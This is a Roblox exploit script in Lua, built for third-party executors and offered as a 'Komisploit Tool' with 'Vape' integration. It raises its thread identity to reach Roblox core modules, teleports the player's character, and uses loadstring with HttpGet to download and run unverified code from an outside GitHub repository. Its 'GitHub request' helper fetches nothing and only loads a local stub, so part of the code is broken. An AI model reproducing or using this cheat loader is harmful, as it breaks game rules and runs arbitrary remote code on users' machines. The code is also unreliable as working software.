-- Main Script: Unified Tool with Vape Integration and Whitelist
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer

-- Create Tool
local Tool = Instance.new("Tool")
Tool.Name = "Komisploit Tool"
Tool.RequiresHandle = false
Tool.CanBeDropped = false
Tool.Parent = LocalPlayer.Backpack

-- Helper Functions
local function createGui()
    local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
    ScreenGui.Name = "KomisploitGui"

    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(0.5, 0, 0.5, 0)
    Frame.Position = UDim2.new(0.25, 0, 0.25, 0)
    Frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    Frame.BorderSizePixel = 2
    Frame.Parent = ScreenGui

    local Button = Instance.new("TextButton")
    Button.Size = UDim2.new(0.6, 0, 0.2, 0)
    Button.Position = UDim2.new(0.2, 0, 0.4, 0)
    Button.BackgroundColor3 = Color3.new(0.5, 0.8, 0.5)
    Button.Text = "Activate KomiSploit"
    Button.Font = Enum.Font.SourceSans
    Button.TextSize = 24
    Button.Parent = Frame

    return ScreenGui, Button
end

local function displayErrorPopup(text, func)
    local setidentity = syn and syn.set_thread_identity or set_thread_identity or setidentity or setthreadidentity or function() end
    local getidentity = syn and syn.get_thread_identity or get_thread_identity or getidentity or getthreadidentity or function() return 8 end
    local oldidentity = getidentity()
    setidentity(8)

    local ErrorPrompt = getrenv().require(CoreGui.RobloxGui.Modules.ErrorPrompt)
    local prompt = ErrorPrompt.new("Default")
    prompt._hideErrorCode = true
    local gui = Instance.new("ScreenGui", CoreGui)
    prompt:setErrorTitle("Komisploit Error")
    prompt:updateButtons({{
        Text = "OK",
        Callback = function()
            prompt:_close()
            if func then func() end
        end,
        Primary = true
    }}, "Default")
    prompt:setParent(gui)
    prompt:_open(text)

    setidentity(oldidentity)
end

local function vapeGithubRequest(scripturl)
    local isfile = isfile or function(file)
        local suc, res = pcall(function() return readfile(file) end)
        return suc and res ~= nil
    end
    local writefile = writefile or function(file, content) end

    if not isfile("vape/" .. scripturl) then
        task.delay(15, function()
            displayErrorPopup("The connection to GitHub is taking a while. Please be patient.")
        end)

        local res = "return --File loaded locally"
        if scripturl:find(".lua") then
            res = "--Cache watermark.\n" .. res
        end
        writefile("vape/" .. scripturl, res)
    end
    return readfile("vape/" .. scripturl)
end

-- Tool GUI and Functionality
local ScreenGui, Button = createGui()

Button.MouseButton1Click:Connect(function()
    print("Komisploit Activated!")
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 50, 0)
    Button.Text = "Activated!"
    wait(2)
    Button.Text = "Activate KomiSploit"
end)

Tool.Activated:Connect(function()
    print("Tool Activated! Toggling GUI...")
    ScreenGui.Enabled = not ScreenGui.Enabled
end)

-- Whitelist and Vape Integration
local function loadVapeScripts()
    print("Whitelist Start")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/bumt1/vape/main/vapelitescripttakedown"))()

    if not shared.VapeDeveloper then
        local commit = "main"
        if isfolder("vape") then
            if not isfile("vape/commithash.txt") then
                writefile("vape/commithash.txt", commit)
            end
        else
            makefolder("vape")
            writefile("vape/commithash.txt", commit)
        end
    end

    return loadstring(vapeGithubRequest("MainScript.lua"))()
end

-- Run the Whitelist/Vape Script
local success, err = pcall(loadVapeScripts)
if not success then
    displayErrorPopup("An error occurred while loading Vape scripts: " .. tostring(err))
end

-- Cleanup when Player's Character is Removed
LocalPlayer.CharacterRemoving:Connect(function()
    ScreenGui:Destroy()
end)

